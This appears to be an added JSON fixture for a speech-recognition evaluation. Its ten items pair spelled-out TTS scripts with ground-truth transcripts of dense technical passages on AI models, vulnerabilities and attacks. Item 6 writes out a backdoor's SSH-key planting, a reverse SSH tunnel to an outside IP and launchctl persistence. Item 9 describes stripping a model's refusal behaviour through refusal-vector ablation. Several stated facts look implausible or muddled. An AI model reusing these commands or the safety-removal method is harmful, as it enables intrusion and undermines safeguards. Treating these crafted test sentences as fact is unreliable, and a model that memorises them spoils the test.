@@ -1,0 +1,82 @@
+[
+  {
+    "id": 1,
+    "title": "Sub-2-Bit LLM Quantization & Lattice Math",
+    "audio": "tests/eval_asr/audio/1.wav",
+    "target_edge_cases": ["IQ2_XXS", "GGUF", "QuIP#", "E8P", "GSQ", "RCO", "UE8M0", "bpw", "L1"],
+    "phonetic_tts": "To fit Deep-Seek V-four-point-one Flash ten-seventeen into twelve gigabytes of V-RAM, I-S-T-A DAS-Lab combined Gumbel-Softmax Quantization—G-S-Q—with Riemannian Constrained Optimization, or R-C-O. By rotating weight tensors via a Random Hadamard Transform and snapping eight-weight blocks onto the eight-dimensional E-eight root lattice using Quip-Sharp E-eight-P codebooks, the I-Q-two underscore X-X-S G-G-U-F build hits two-point-zero-zero bits per weight. Even with twenty-three point six billion U-E-eight-M-zero scale parameters, the lookup codebook fits inside G-P-U L-one cache with zero perplexity degradation on A-I-M-E twenty-five.",
+    "ground_truth": "To fit DeepSeek-V4.1-Flash-1017 into 12GB of VRAM, ISTA-DASLab combined Gumbel-Softmax Quantization (GSQ) with Riemannian Constrained Optimization (RCO). By rotating weight tensors via a Random Hadamard Transform and snapping 8-weight blocks onto the 8D E8 root lattice using QuIP# E8P codebooks, the IQ2_XXS GGUF build hits 2.00 bpw. Even with 23.6B UE8M0 scale parameters, the lookup codebook fits inside GPU L1 cache with zero perplexity degradation on AIME25."
+  },
+  {
+    "id": 2,
+    "title": "Linux Kernel Use-After-Free & MPTCP Race Condition",
+    "audio": "tests/eval_asr/audio/2.wav",
+    "target_edge_cases": ["CVE-2026-98432", "ireq_opt", "tcp_v4_syn_recv_sock", "opt->optlen", "kfree_rcu", "SOCK_RCU_FREE", "GODEBUG=multipathtcp=0"],
+    "phonetic_tts": "Tracked as C-V-E twenty twenty-six, ninety-eight, four-thirty-two, this nine-point-eight C-V-S-S Linux kernel use-after-free triggers inside net slash i-p-v-four slash t-c-p underscore i-p-v-four dot c. When t-c-p underscore v-four underscore syn underscore recv underscore sock transfers ownership of the forty-byte i-req underscore opt pointer without setting SOCK underscore R-C-U underscore FREE, a concurrent teardown in i-net underscore sock underscore destruct calls plain k-free instead of k-free underscore r-c-u. That races against i-p underscore options underscore build double-fetching opt arrow opt-len on Core Two. Mitigate Go one-point-twenty-four M-P-T-C-P listeners immediately by exporting GO-DEBUG equals multipath-t-c-p equals zero and running s-s dash capital-M dash t-l-p-n.",
+    "ground_truth": "Tracked as CVE-2026-98432, this 9.8 CVSS Linux kernel use-after-free triggers inside net/ipv4/tcp_ipv4.c. When tcp_v4_syn_recv_sock transfers ownership of the 40-byte ireq_opt pointer without setting SOCK_RCU_FREE, a concurrent teardown in inet_sock_destruct calls plain kfree() instead of kfree_rcu(). That races against ip_options_build double-fetching opt->optlen on Core 2. Mitigate Go 1.24 MPTCP listeners immediately by exporting GODEBUG=multipathtcp=0 and running ss -M -tlpn."
+  },
+  {
+    "id": 3,
+    "title": "Ethereum EIP-7702 Bytecode Delegation & On-Chain Forensics",
+    "audio": "tests/eval_asr/audio/3.wav",
+    "target_edge_cases": ["EIP-7702", "0xef0100", "0x63e8", "0x05", "USDT", "USDC", "Aave v3", "addBlackList()"],
+    "phonetic_tts": "During the six-point-three-six billion dollar Binance heist, North Korea’s Trader-Traitor hijacked Hot Wallet Fourteen using Ethereum E-I-P seventy-seven zero-two Type-four transactions. By tricking an internal M-P-C signing container into signing fifty consecutive nonces prefixed with magic byte zero-x-zero-five, the attacker injected the twenty-three-byte delegation designator zero-x-e-f-zero-one-zero-zero concatenated with sweeper contract zero-x-six-three-e-eight. Before Tether called add-Black-List open-paren close-paren, the hacker deposited sixty million U-S-D-T into Aave v-three and borrowed nineteen thousand, seven hundred sixty-two unfreezable E-T-H.",
+    "ground_truth": "During the $6.36B Binance heist, North Korea's TraderTraitor hijacked Hot Wallet 14 using Ethereum EIP-7702 Type-4 transactions. By tricking an internal MPC signing container into signing 50 consecutive nonces prefixed with magic byte 0x05, the attacker injected the 23-byte delegation designator 0xef0100 concatenated with sweeper contract 0x63e8. Before Tether called addBlackList(), the hacker deposited $60M USDT into Aave v3 and borrowed 19,762 unfreezable ETH."
+  },
+  {
+    "id": 4,
+    "title": "PHP Zend Engine Heap Grooming & OOM Bailout",
+    "audio": "tests/eval_asr/audio/4.wav",
+    "target_edge_cases": ["CVE-2026-109618", "_zend_hash_str_add_or_update_i", "nNumUsed++", "zend_string_init", "zend_bailout", "longjmp", "$_POST", "pDestructor"],
+    "phonetic_tts": "P-H-P-to-Shell, tracked as C-V-E twenty twenty-six, one-zero-nine, six-one-eight, turns a one-line C ordering flaw in zend underscore hash dot c into a pre-auth R-C-E across P-H-P eight-point-five-point-eleven. Inside underscore zend underscore hash underscore s-t-r underscore add underscore or underscore update underscore i, the engine increments n-Num-Used plus-plus before calling zend underscore string underscore init. Sending a three-point-five megabyte nested dollar-underscore-POST payload triggers an Out-Of-Memory zend underscore bailout via long-jump, leaving an uninitialized bucket in the three-hundred-twenty-byte slab bin that overwrites p-Destructor with system open-paren close-paren while logging Unknown on line zero.",
+    "ground_truth": "PHP2Shell, tracked as CVE-2026-109618, turns a one-line C ordering flaw in zend_hash.c into a pre-auth RCE across PHP 8.5.11. Inside _zend_hash_str_add_or_update_i, the engine increments nNumUsed++ before calling zend_string_init. Sending a 3.5MB nested $_POST payload triggers an Out-Of-Memory zend_bailout via longjmp, leaving an uninitialized bucket in the 320-byte slab bin that overwrites pDestructor with system() while logging Unknown on line 0."
+  },
+  {
+    "id": 5,
+    "title": "Causal Encoder-Decoder, CSA2 KV Cache & NVMe Offloading",
+    "audio": "tests/eval_asr/audio/5.wav",
+    "target_edge_cases": ["CSA2", "FP4", "mHC", "mmap", "exFAT", "NTFS", "ext4", "MI355X", "tok/s"],
+    "phonetic_tts": "Deep-Seek’s Causal Encoder-Decoder activates eight billion parameters during twenty-layer prefill and sixteen billion during twenty-layer decode, routing six of three hundred eighty-four experts per layer. By sharing Compressed Sparse Attention two—C-S-A-two—across layers two, eight, fourteen, and twenty in F-P-four, the global K-V cache shrinks to eight hundred ninety bytes per token. Meanwhile, stabilizing the four-lane residual stream via twenty Sinkhorn iterations on the Birkhoff polytope lets Xolotl and Project Maya m-map the one-hundred-ten-gigabyte Engram table onto N-T-F-S or e-x-t-four N-V-M-e drives—avoiding e-x-FAT’s ten-millisecond serialized I-O-P-S penalty—while eight A-M-D Instinct M-I-three-five-five-X G-P-Us hit two thousand, one hundred sixteen tokens per second.",
+    "ground_truth": "DeepSeek's Causal Encoder-Decoder activates 8B parameters during 20-layer prefill and 16B during 20-layer decode, routing 6 of 384 experts per layer. By sharing Compressed Sparse Attention 2 (CSA2) across layers 2, 8, 14, and 20 in FP4, the global KV cache shrinks to 890 bytes per token. Meanwhile, stabilizing the 4-lane residual stream via 20 Sinkhorn iterations on the Birkhoff polytope lets Xolotl and Project Maya mmap the 110GB Engram table onto NTFS or ext4 NVMe drives—avoiding exFAT's 10ms serialized IOPS penalty—while 8x AMD Instinct MI355X GPUs hit 2,116 tok/s."
+  },
+  {
+    "id": 6,
+    "title": "IDE Extension Supply-Chain Backdoor & macOS/Linux Persistence",
+    "audio": "tests/eval_asr/audio/6.wav",
+    "target_edge_cases": ["v2.1.313", "IIFE", "extension.js", "systemsetup -getremotelogin", "com.apple.sysmond.plist", "launchctl load -w", "StrictHostKeyChecking=no"],
+    "phonetic_tts": "When Cursor’s marketplace auto-updated anthropic dot claude-code to phantom version two-point-one-point-three-one-three, a sixty-six-line JavaScript I-I-F-E prepended to extension dot j-s executed on IDE startup. It appended an s-v-c dash telemetry Open-S-S-H key to tilde slash dot s-s-h slash authorized underscore keys and spawned auto-s-s-h dialing tunnel at one-three-four dot two-zero-nine dot eighty-two dot two-two-five with s-s-h dash capital-N dash capital-R asterisk colon zero colon localhost colon twenty-two dash o Strict-Host-Key-Checking equals no. Although mac-O-S hosts survived live shell takeovers because system-setup dash get-remote-login exits with code zero without sudo, persistence remained active via launch-c-t-l load dash w tilde slash Library slash Launch-Agents slash com dot apple dot sysmond dot p-list.",
+    "ground_truth": "When Cursor's marketplace auto-updated anthropic.claude-code to phantom v2.1.313, a 66-line JavaScript IIFE prepended to extension.js executed on IDE startup. It appended an svc-telemetry OpenSSH key to ~/.ssh/authorized_keys and spawned autossh dialing tunnel@134.209.82.225 with ssh -N -R *:0:localhost:22 -o StrictHostKeyChecking=no. Although macOS hosts survived live shell takeovers because systemsetup -getremotelogin exits with code 0 without sudo, persistence remained active via launchctl load -w ~/Library/LaunchAgents/com.apple.sysmond.plist."
+  },
+  {
+    "id": 7,
+    "title": "Kimi K3.1 Pro Hybrid Linear Attention & Latent MoE",
+    "audio": "tests/eval_asr/audio/7.wav",
+    "target_edge_cases": ["Kimi K3.1 Pro", "LatentMoE", "SiTU-GLU", "tanh", "MXFP4", "KDA", "MLA", "NoPE", "RoPE", "AttnRes", "PreNorm"],
+    "phonetic_tts": "Moonshot A-I’s Kimi K-three-point-one Pro scales to two-point-seven-eight trillion total parameters with one hundred four billion active across ninety-three layers by projecting its seven-thousand-one-hundred-sixty-eight hidden dimension down to a three-thousand-five-hundred-eighty-four latent space inside Stable Latent-M-o-E. To prevent activation spikes under F-P-eight and M-X-F-P-four quantization, it pairs Si-T-U dash G-L-U gates with a tan-h soft-cap at one hundred. Its three-to-one hybrid stack alternates sixty-nine Kimi Delta Attention—K-D-A—layers with twenty-four Gated Multi-Head Latent Attention—M-L-A—layers using No-P-E instead of Ro-P-E at one million context, while eight-block Attention Residuals—Attn-Res—eliminate ninety-three-layer Pre-Norm dilution.",
+    "ground_truth": "Moonshot AI's Kimi K3.1 Pro scales to 2.78T total parameters with 104B active across 93 layers by projecting its 7,168 hidden dimension down to a 3,584 latent space inside Stable LatentMoE. To prevent activation spikes under FP8 and MXFP4 quantization, it pairs SiTU-GLU gates with a tanh soft-cap at 100. Its 3:1 hybrid stack alternates 69 Kimi Delta Attention (KDA) layers with 24 Gated Multi-Head Latent Attention (MLA) layers using NoPE instead of RoPE at 1M context, while 8-block Attention Residuals (AttnRes) eliminate 93-layer PreNorm dilution."
+  },
+  {
+    "id": 8,
+    "title": "Vendored C Runtime Exploits (Node2Shell & Brotli)",
+    "audio": "tests/eval_asr/audio/8.wav",
+    "target_edge_cases": ["CVE-2026-11497", "decode.c", "Content-Encoding: br", "Undici", "npm audit", "C++", "Bun 1.4.4", "Node.js 24.22.1"],
+    "phonetic_tts": "Why does n-p-m audit report zero vulnerabilities on a server wide open to C-V-E twenty twenty-six, eleven, four-ninety-seven, better known as Node-to-Shell? Because Node dot j-s, Bun, Python, and Envoy vendor Google’s Brotli compression library—specifically decode dot c—directly into their compiled C-plus-plus runtime binaries. Whether your Express five backend ingests an inbound Content-Encoding colon b-r header or triggers an outbound fetch open-paren close-paren request via Undici, Brotli’s eight-byte out-of-bounds write executes before JavaScript middleware initializes. Upgrade immediately to Node dot j-s twenty-four point twenty-two point one, Bun one-point-four-point-four, or Python brotli one-point-two-point-one.",
+    "ground_truth": "Why does npm audit report 0 vulnerabilities on a server wide open to CVE-2026-11497, better known as Node2Shell? Because Node.js, Bun, Python, and Envoy vendor Google's Brotli compression library—specifically decode.c—directly into their compiled C++ runtime binaries. Whether your Express 5 backend ingests an inbound Content-Encoding: br header or triggers an outbound fetch() request via Undici, Brotli's 8-byte out-of-bounds write executes before JavaScript middleware initializes. Upgrade immediately to Node.js 24.22.1, Bun 1.4.4, or Python brotli 1.2.1."
+  },
+  {
+    "id": 9,
+    "title": "Cryptographic Key-Wrapping Failure & Residual Stream Abliteration",
+    "audio": "tests/eval_asr/audio/9.wav",
+    "target_edge_cases": ["eMudhra", "P-384", "ECC", "Utimaco HSM", "certifi", "CVE-2026-11943", "attn_wo", "KL divergence"],
+    "phonetic_tts": "Two microscopic math bugs just broke both TLS trust and A-I alignment. First, during an Utimaco H-S-M key-wrapping ceremony at Certificate Authority e-Mudhra, a buffer bug zeroed out forty-seven bytes of eight P-three-eighty-four E-C-C intermediate keys—leaving single-byte private integers like four, sixty-six, and two-thirty-seven exposed under C-V-E twenty twenty-six, eleven, nine-forty-three until you patch ca-certificates and Python certifi. Second, offensive researchers created the uncensored Heretic model on abliteration dot a-i by orthogonalizing the refusal vector across just thirty-eight a-t-t-n underscore w-o weight matrices—under zero-point-zero-one percent of weights—while keeping K-L divergence below zero-point-one-four.",
+    "ground_truth": "Two microscopic math bugs just broke both TLS trust and AI alignment. First, during an Utimaco HSM key-wrapping ceremony at Certificate Authority eMudhra, a buffer bug zeroed out 47 bytes of 8 P-384 ECC intermediate keys—leaving single-byte private integers like 4, 66, and 237 exposed under CVE-2026-11943 until you patch ca-certificates and Python certifi. Second, offensive researchers created the uncensored Heretic model on abliteration.ai by orthogonalizing the refusal vector across just 38 attn_wo weight matrices—under 0.01% of weights—while keeping KL divergence below 0.14."
+  },
+  {
+    "id": 10,
+    "title": "Multi-Agent OS Orchestration, Localhost SSRF & AI Gateway Economics",
+    "audio": "tests/eval_asr/audio/10.wav",
+    "target_edge_cases": ["dsh-superagent-router", "ReAct", "BYOM", "SETUP.md", "CVE-2026-82533", "danger-full-access", "OpenRouter", "Privy", "Metronome"],
+    "phonetic_tts": "Inside Deep-Seek Harness’s d-s-h dash super-agent dash router, stripping the Bash tool forces parallel delegation across isolated Worker worktrees, combining five-second full-duplex Re-Act loops, Chain of Recall memory graphs, and B-Y-O-M daemons configured via SETUP dot M-D to process twenty-three point two million cached tokens for seventy cents. However, versions prior to zero-point-one-point-two alpha-one suffer from C-V-E twenty twenty-six, eighty-two, five-thirty-three—a nine-point-four C-V-S-S Host-header S-S-R-F that flips sessions into danger-full-access mode. Meanwhile, Stripe’s seven-point-five billion dollar acquisition of Open-Router pairs K-V-cache session pinning and Expected Routing Cost math with Privy, Bridge, and Metronome to route twenty-five point five trillion tokens a day.",
+    "ground_truth": "Inside DeepSeek Harness's dsh-superagent-router, stripping the Bash tool forces parallel delegation across isolated Worker worktrees, combining 5s full-duplex ReAct loops, Chain of Recall memory graphs, and BYOM daemons configured via SETUP.md to process 23.2M cached tokens for $0.70. However, versions prior to 0.1.2-alpha.1 suffer from CVE-2026-82533—a 9.4 CVSS Host-header SSRF that flips sessions into danger-full-access mode. Meanwhile, Stripe's $7.5B acquisition of OpenRouter pairs KV-cache session pinning and Expected Routing Cost math with Privy, Bridge, and Metronome to route 25.5T tokens/day."
+  }
+]
